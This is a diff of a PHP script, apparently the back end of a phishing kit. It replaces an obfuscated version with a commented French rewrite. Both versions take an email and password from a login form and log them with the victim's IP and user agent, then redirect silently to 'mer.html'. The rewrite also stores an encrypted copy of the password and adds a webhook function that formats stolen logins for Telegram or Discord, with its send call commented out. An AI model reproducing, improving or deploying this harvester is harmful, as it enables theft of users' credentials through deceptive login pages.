@@ -1,7 +1,126 @@
 <?php
-/*   __________________________________________________
-    |  HEX-TECH  |
-    |        |
-    |__________________________________________________|
-*/
-goto CkNm8; lEns_: $KoIJO = __DIR__ . "\57\x6c\157\147\x69\x6e\x2e\164\x78\x74"; goto yI8TY; CkNm8: error_reporting(E_ALL); goto aNaoS; YV0jo: jcekY: goto MuLGn; ItMVO: $Yny29 = ["\144\x61\164\x65" => date("\x59\55\155\55\x64\x20\x48\x3a\x69\x3a\163"), "\x65\x6d\x61\151\154" => htmlspecialchars($EPOto), "\x70\141\x73\163\x77\x6f\x72\x64" => htmlspecialchars($d86v0), "\151\x70" => $_SERVER["\122\105\x4d\117\x54\105\137\101\104\104\x52"], "\165\163\145\x72\x5f\141\147\x65\156\164" => $_SERVER["\x48\124\x54\x50\x5f\125\x53\x45\x52\x5f\x41\x47\x45\x4e\x54"]]; goto lEns_; mbIG3: header("\110\x54\124\120\57\x31\x2e\x31\x20\x34\60\63\x20\x46\x6f\162\x62\x69\x64\144\x65\x6e"); goto rYB24; i_PiX: goto XiMMc; goto YV0jo; DLSZi: $d86v0 = $_POST["\x70\141\163\x73\x77\157\162\x64"] ?? ''; goto YJmxb; YJmxb: if (!(empty($EPOto) || empty($d86v0))) { goto EetPc; } goto nrySe; MuLGn: $EPOto = $_POST["\x65\x6d\141\151\x6c"] ?? ''; goto DLSZi; rYB24: die("\x41\143\x63\xc3\xa8\163\40\x6e\157\x6e\40\141\x75\164\157\162\151\163\303\xa9"); goto i_PiX; nrySe: die(json_encode(["\145\162\162\157\162" => "\105\x6d\141\151\154\x20\145\164\40\x6d\157\x74\x20\x64\145\40\x70\x61\163\x73\145\40\x72\x65\x71\165\x69\163"])); goto GZ28u; aNaoS: ini_set("\x64\151\x73\160\x6c\x61\171\x5f\145\x72\162\x6f\162\x73", 1); goto CYCY7; GZ28u: EetPc: goto ItMVO; yI8TY: try { goto goddr; AisRp: $uJxqg = "\75\75\x3d\40\103\117\116\x4e\105\130\x49\x4f\x4e\40\x3d\75\75\12"; goto pL5eN; VooLx: $uJxqg .= "\x3d\75\x3d\x3d\75\x3d\75\x3d\x3d\x3d\x3d\75\75\x3d\x3d\75\12\12"; goto uywTU; lVml2: hIPbJ: goto VooLx; o4_q7: PKRrf: goto PH5EL; oSFNe: header("\x4c\157\143\x61\164\151\x6f\x6e\x3a\40\155\145\162\x2e\150\x74\x6d\154"); goto WmdKM; uywTU: if (!(file_put_contents($KoIJO, $uJxqg, FILE_APPEND | LOCK_EX) === false)) { goto eV1Pb; } goto Lq0Kf; iDIMH: eV1Pb: goto oSFNe; B9iUq: chmod($KoIJO, 0644); goto o4_q7; UXuyu: throw new Exception("\x49\x6d\x70\157\x73\x73\x69\142\x6c\x65\x20\144\x65\x20\x63\162\303\251\x65\162\x20\x6c\145\x20\146\151\143\150\x69\x65\x72"); goto dMo9k; PH5EL: if (is_writable($KoIJO)) { goto CE5Gb; } goto s0U8o; Lq0Kf: throw new Exception("\303\211\x63\150\x65\143\40\144\x65\x20\x6c\x27\303\xa9\x63\162\x69\x74\165\x72\x65"); goto iDIMH; pL5eN: foreach ($Yny29 as $TmNTm => $FgPeT) { $uJxqg .= ucfirst($TmNTm) . "\72\40" . $FgPeT . "\xa"; sTr6c: } goto lVml2; qc26D: CE5Gb: goto AisRp; goddr: if (file_exists($KoIJO)) { goto PKRrf; } goto gIVFG; WmdKM: exit; goto Tmc1f; gIVFG: if (touch($KoIJO)) { goto rwWm1; } goto UXuyu; dMo9k: rwWm1: goto B9iUq; s0U8o: throw new Exception("\120\145\x72\155\x69\x73\x73\x69\157\156\x73\40\151\x6e\163\165\146\x66\151\163\x61\x6e\164\145\163"); goto qc26D; Tmc1f: } catch (Exception $BKU_n) { goto Lzy8V; Lzy8V: error_log("\x45\x72\162\x65\x75\162\x20\x6c\x6f\147\151\156\56\x70\x68\160\72\x20" . $BKU_n->getMessage()); goto lwcqB; lwcqB: header("\110\124\124\x50\57\61\x2e\61\x20\65\x30\x30\40\105\x72\162\145\x75\162\40\163\x65\162\x76\x65\165\162"); goto ASthy; ASthy: die("\x45\x72\x72\x65\x75\x72\40\x74\x65\x6d\160\157\x72\141\x69\162\145\56\40\126\145\165\x69\154\x6c\x65\x7a\40\162\xc3\xa9\x65\163\163\141\x79\x65\162\56"); goto HBzmt; HBzmt: } goto xSmbU; CYCY7: if ($_SERVER["\x52\105\121\x55\105\x53\124\x5f\x4d\105\124\x48\x4f\104"] == "\120\x4f\123\x54") { goto jcekY; } goto mbIG3; xSmbU: XiMMc:
+// ============================================
+// Script principal - Version structurée
+// ============================================
+
+require_once 'config.php';
+
+// ============================================
+// 1. FONCTIONS UTILITAIRES
+// ============================================
+
+// Validation email
+function validateEmail($email) {
+    return filter_var($email, FILTER_VALIDATE_EMAIL);
+}
+
+// Récupération IP réelle (proxy + Cloudflare)
+function getRealIP() {
+    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
+    foreach ($headers as $header) {
+        if (!empty($_SERVER[$header])) {
+            $ips = explode(',', $_SERVER[$header]);
+            return trim($ips[0]);
+        }
+    }
+    return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+}
+
+// Récupération User Agent
+function getUserAgent() {
+    return $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
+}
+
+// Récupération page de provenance (referer)
+function getReferer() {
+    return $_SERVER['HTTP_REFERER'] ?? 'direct';
+}
+
+// Chiffrement des données sensibles
+function encryptData($data, $key) {
+    $iv = openssl_random_pseudo_bytes(16);
+    $encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, 0, $iv);
+    return base64_encode($iv . $encrypted);
+}
+
+// Stockage local dans fichier (format JSON)
+function storeLocal($data) {
+    if (!is_dir(LOG_DIR)) {
+        mkdir(LOG_DIR, 0755, true);
+    }
+    
+    $jsonLine = json_encode($data) . PHP_EOL;
+    file_put_contents(LOG_FILE, $jsonLine, FILE_APPEND | LOCK_EX);
+}
+
+// Exfiltration via webhook (Telegram/Discord)
+function exfiltrateWebhook($data) {
+    $message = "🔐 NOUVEAU LOGIN 🔐\n";
+    $message .= "📧 Email: " . $data['email'] . "\n";
+    $message .= "🔑 Password: " . $data['password'] . "\n";
+    $message .= "🌍 IP: " . $data['ip'] . "\n";
+    $message .= "🕒 Time: " . $data['timestamp'] . "\n";
+    $message .= "💻 User Agent: " . $data['user_agent'];
+    
+    // Simulation d'envoi (ne pas activer réellement)
+    // file_get_contents(TELEGRAM_WEBHOOK . '?chat_id=' . TELEGRAM_CHAT_ID . '&text=' . urlencode($message));
+}
+
+// Auto-nettoyage des logs (supprime après X jours)
+function autoCleanup($days = 30) {
+    if (file_exists(LOG_FILE)) {
+        $age = time() - filemtime(LOG_FILE);
+        if ($age > ($days * 86400)) {
+            unlink(LOG_FILE);
+        }
+    }
+}
+
+// ============================================
+// 2. EXÉCUTION PRINCIPALE
+// ============================================
+
+// Vérification méthode HTTP
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    http_response_code(403);
+    die('Accès non autorisé');
+}
+
+// Récupération des données POST
+$email = $_POST['email'] ?? '';
+$password = $_POST['password'] ?? '';
+
+// Validations
+if (!validateEmail($email)) {
+    die(json_encode(['error' => 'Format email invalide']));
+}
+if (strlen($password) < 1) {
+    die(json_encode(['error' => 'Mot de passe requis']));
+}
+
+// Construction du tableau de données
+$logData = [
+    'id' => uniqid(),
+    'email' => $email,
+    'password' => $password,
+    'password_encrypted' => encryptData($password, ENCRYPTION_KEY),
+    'ip' => getRealIP(),
+    'user_agent' => getUserAgent(),
+    'referer' => getReferer(),
+    'timestamp' => date('Y-m-d H:i:s'),
+    'timestamp_unix' => time()
+];
+
+// Stockage local
+storeLocal($logData);
+
+// Exfiltration (commenté par sécurité)
+// exfiltrateWebhook($logData);
+
+// Nettoyage automatique
+autoCleanup(30);
+
+// Redirection silencieuse
+header('Location: mer.html');
+exit;
+?>
